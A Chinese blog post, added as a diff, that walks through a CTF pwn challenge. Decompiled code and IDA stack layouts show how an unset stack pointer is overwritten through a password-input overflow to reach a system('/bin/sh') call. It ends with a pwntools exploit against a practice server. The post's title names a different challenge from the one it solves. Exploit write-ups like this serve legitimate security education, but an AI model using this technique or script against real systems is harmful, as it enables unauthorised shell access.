@@ -1,0 +1,251 @@
+---
+layout: post
+title:  babyfengshui_33c3_2016
+date:   2021-02-23 00:01:01 +0300
+image:  2021-02-23-rose.jpg
+tags:   [ctf,Pwn,ZJCTF2019,ret2text]
+---
+
+#### main()
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int (*v3)(); // rax
+  User *v4; // rbx
+  User *v5; // rax
+  __int64 *v7; // [rsp+10h] [rbp-130h]
+  char v8; // [rsp+20h] [rbp-120h]
+  char v9[8]; // [rsp+D0h] [rbp-70h]
+  char v10; // [rsp+E0h] [rbp-60h]
+  unsigned __int64 v11; // [rsp+128h] [rbp-18h]
+
+  v11 = __readfsqword(0x28u);
+  setbuf(stdout, 0LL);
+  strcpy(v9, "2jctf_pa5sw0rd");
+  memset(&v10, 0, 0x40uLL);
+  Admin::Admin((Admin *)&v8, "admin", v9);
+  puts(
+    " _____   _  ____ _____ _____   _                _       \n"
+    "|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  \n"
+    "  / /_  | | |     | | | |_    | |   / _ \\ / _` | | '_ \\ \n"
+    " / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |\n"
+    "/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|\n"
+    "                                          |___/         ");
+  printf("Please enter username: ", "admin");
+  User::read_name((User *)&login);
+  printf("Please enter password: ");
+  v3 = main::{lambda(void)#1}::operator void (*)(void) const();
+  v7 = password_checker((void (*)(void))v3);
+  User::read_password((User *)&login);
+  v4 = User::get_password((User *)&v8);
+  v5 = User::get_password((User *)&login);
+  password_checker(void (*)(void))::{lambda(char const*,char const*)#1}::operator() const(
+    (void (__fastcall ***)(char *))&v7,
+    (const char *)v5,
+    (const char *)v4);
+  return 0;
+}
+```
+
+#### User::shell(User *this)
+
+```assembly
+int __fastcall User::shell(User *this)
+{
+  return puts("No shell for you!");
+}
+```
+
+#### Admin::shell(Admin *this)
+
+```assembly
+int __fastcall Admin::shell(Admin *this)
+{
+  puts("Congratulations!");
+  return system("/bin/sh");
+}
+```
+
+#### password_checker(void (*)(void))::{lambda(char const*,char const*)#1}::operator() const(void (__fastcall ***a1)(char *), const char *a2, const char *a3)
+
+```assembly
+unsigned __int64 __fastcall password_checker(void (*)(void))::{lambda(char const*,char const*)#1}::operator() const(void (__fastcall ***a1)(char *), const char *a2, const char *a3)
+{
+  char s; // [rsp+20h] [rbp-60h]
+  unsigned __int64 v5; // [rsp+78h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  if ( !strcmp(a2, a3) )
+  {
+    snprintf(&s, 0x50uLL, "Password accepted: %s\n", &s);
+    puts(&s);
+    (**a1)(&s);
+  }
+  else
+  {
+    puts("Nope!");
+  }
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+
+当验证密码通过后，可以看到有一处
+
+```assembly
+(**a1)(&s);
+```
+
+a1是函数的第一个参数，是一个指向指针的指针，这里将**a1当作函数来执行。所以我们想将其值改为Admin::shell()的地址，从而getshell。
+
+在main()函数中查看，password_checker()函数的返回值赋值给v7，并传入了上面的函数，作为第一个参数。
+
+```assembly
+v7 = password_checker((void (*)(void))v3);
+```
+
+查看password_checker()函数。
+
+```assembly
+__int64 *__fastcall password_checker(void (*a1)(void))
+{
+  __int64 v2; // [rsp+0h] [rbp-18h]
+
+  return &v2;
+}
+```
+
+这里我们看到函数声明了要返回的变量，却没有赋值。
+
+正好main()函数中，password_checker()函数执行后，会执行User::read_password()读入密码，我们想要利用这个可以输入的函数将v2的值改为Admin::shell()的地址。
+
+#### User::read_password()
+
+```assembly
+unsigned __int64 __fastcall User::read_password(User *this)
+{
+  _QWORD *v1; // rax
+  char s[8]; // [rsp+10h] [rbp-60h]
+  __int64 v4; // [rsp+18h] [rbp-58h]
+  __int64 v5; // [rsp+20h] [rbp-50h]
+  __int64 v6; // [rsp+28h] [rbp-48h]
+  __int64 v7; // [rsp+30h] [rbp-40h]
+  __int64 v8; // [rsp+38h] [rbp-38h]
+  __int64 v9; // [rsp+40h] [rbp-30h]
+  __int64 v10; // [rsp+48h] [rbp-28h]
+  __int64 v11; // [rsp+50h] [rbp-20h]
+  __int64 v12; // [rsp+58h] [rbp-18h]
+  unsigned __int64 v13; // [rsp+68h] [rbp-8h]
+
+  v13 = __readfsqword(0x28u);
+  fgets(s, 79, stdin);
+  strip_newline(s, 0x50uLL);
+  v1 = (_QWORD *)((char *)this + 88);
+  *v1 = *(_QWORD *)s;
+  v1[1] = v4;
+  v1[2] = v5;
+  v1[3] = v6;
+  v1[4] = v7;
+  v1[5] = v8;
+  v1[6] = v9;
+  v1[7] = v10;
+  v1[8] = v11;
+  v1[9] = v12;
+  return __readfsqword(0x28u) ^ v13;
+}
+```
+
+可以溢出，在ida上可以看到s为rbp-60h，查看栈。
+
+```assembly
+-0000000000000070 ; D/A/*   : change type (data/ascii/array)
+-0000000000000070 ; N       : rename
+-0000000000000070 ; U       : undefine
+-0000000000000070 ; Use data definition commands to create local variables and function arguments.
+-0000000000000070 ; Two special fields " r" and " s" represent return address and saved registers.
+-0000000000000070 ; Frame size: 70; Saved regs: 8; Purge: 0
+-0000000000000070 ;
+-0000000000000070
+-0000000000000070                 db ? ; undefined
+-000000000000006F                 db ? ; undefined
+-000000000000006E                 db ? ; undefined
+-000000000000006D                 db ? ; undefined
+-000000000000006C                 db ? ; undefined
+-000000000000006B                 db ? ; undefined
+-000000000000006A                 db ? ; undefined
+-0000000000000069                 db ? ; undefined
+-0000000000000068 var_68          dq ?
+-0000000000000060 s               db 8 dup(?)
+-0000000000000058 var_58          dq ?
+-0000000000000050 var_50          dq ?
+-0000000000000048 var_48          dq ?
+-0000000000000040 var_40          dq ?
+-0000000000000038 var_38          dq ?
+-0000000000000030 var_30          dq ?
+-0000000000000028 var_28          dq ?
+-0000000000000020 var_20          dq ?
+-0000000000000018 var_18          dq ?
+-0000000000000010                 db ? ; undefined
+-000000000000000F                 db ? ; undefined
+-000000000000000E                 db ? ; undefined
+-000000000000000D                 db ? ; undefined
+-000000000000000C                 db ? ; undefined
+-000000000000000B                 db ? ; undefined
+-000000000000000A                 db ? ; undefined
+-0000000000000009                 db ? ; undefined
+-0000000000000008 var_8           dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+要想通过溢出覆盖password_checker()函数中v2变量的值，就要知道v2变量在栈中的位置。查看栈
+
+```assembly
+-0000000000000018 ; D/A/*   : change type (data/ascii/array)
+-0000000000000018 ; N       : rename
+-0000000000000018 ; U       : undefine
+-0000000000000018 ; Use data definition commands to create local variables and function arguments.
+-0000000000000018 ; Two special fields " r" and " s" represent return address and saved registers.
+-0000000000000018 ; Frame size: 18; Saved regs: 8; Purge: 0
+-0000000000000018 ;
+-0000000000000018
+-0000000000000018 var_18          dq ?
+-0000000000000010                 db ? ; undefined
+-000000000000000F                 db ? ; undefined
+-000000000000000E                 db ? ; undefined
+-000000000000000D                 db ? ; undefined
+-000000000000000C                 db ? ; undefined
+-000000000000000B                 db ? ; undefined
+-000000000000000A                 db ? ; undefined
+-0000000000000009                 db ? ; undefined
+-0000000000000008 var_8           dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+可以得到v2的位置为rbp-18h。
+
+**其实由于这里的函数都是在`main()`函数中调用的，所以`password_checker()`函数退栈后，`read_password()`函数在同一位置开栈（被调用函数都在同一位置上开栈）。**
+
+#### exp：
+
+```assembly
+from pwn import *
+
+io = remote("node3.buuoj.cn", 26234)
+
+io.recvuntil("Please enter username: ")
+io.sendline("admin")
+io.recvuntil("Please enter password: ")
+shell = 0x400e88
+payload = "2jctf_pa5sw0rd"
+payload = payload.ljust(0x60 - 0x18, "\x00") + p64(shell)
+io.sendline(payload)
+
+io.interactive()
+```
+
